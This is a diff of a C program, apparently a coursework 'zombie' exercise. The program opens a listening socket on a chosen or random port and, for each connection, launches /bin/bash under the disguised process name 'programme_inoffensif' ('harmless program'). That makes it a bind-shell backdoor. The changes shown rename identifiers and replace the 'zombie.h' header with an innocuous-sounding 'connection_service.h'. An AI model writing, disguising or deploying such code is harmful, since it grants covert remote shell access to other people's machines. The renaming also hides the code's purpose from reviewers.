@@ -5,12 +5,7 @@
 #include <unistd.h>
 
 #include "utils_v2.h"
-#include "zombie.h"
-
-#define BACKLOG 5
-
-#define BUFFER_SZ 1024
-#define BASH "programme_inoffensif"
+#include "connection_service.h"
 
 void child(void *newsockfd) {
   int *socketfd = newsockfd;
@@ -22,7 +17,7 @@ void child(void *newsockfd) {
   sexecl("/bin/bash", BASH, NULL);
 }
 
-int create_socket(unsigned short PORT) {
+int createSocket(unsigned short PORT) {
   int sockfd = ssocket();
   sbind(PORT, sockfd);
   slisten(sockfd, BACKLOG);
@@ -36,11 +31,11 @@ int main(int argc, char *arg[]) {
   if (arg[1] != NULL) {
     PORT = atoi(arg[1]);
   } else {
-    int random = randomIntBetween(0, NBR_PORTS - 1);
-    PORT = PORTS[random];
+    int random = randomIntBetween(0, NUM_PORTS - 1);
+    PORT = PORT_TABLE[random];
   }
 
-  int sockfd = create_socket(PORT);
+  int sockfd = createSocket(PORT);
 
   while (1) {
     int newsockfd = saccept(sockfd);
